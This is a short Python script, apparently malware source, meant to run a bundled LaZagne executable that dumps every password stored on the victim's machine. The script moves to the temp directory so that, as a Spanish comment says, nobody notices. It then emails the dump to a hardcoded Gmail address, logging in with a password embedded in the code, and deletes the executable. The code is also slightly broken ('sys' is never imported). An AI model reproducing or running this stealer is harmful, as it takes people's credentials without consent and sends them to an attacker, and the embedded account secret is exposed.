#!/usr/bin/env python

import subprocess, smtplib, os, tempfile

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#Primero movernos al directorio temporal asi nadie se de cuenta.

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

payload_name = sys._MEIPASS + "lazagne_x64.exe"
result = subprocess.check_output(payload_name + " all", shell=True)
send_mail("aet3rnum2020@gmail.com", "pYo7HfcnMc", result)
#Borramos el archivo
os.remove("lazagne_x64.exe")
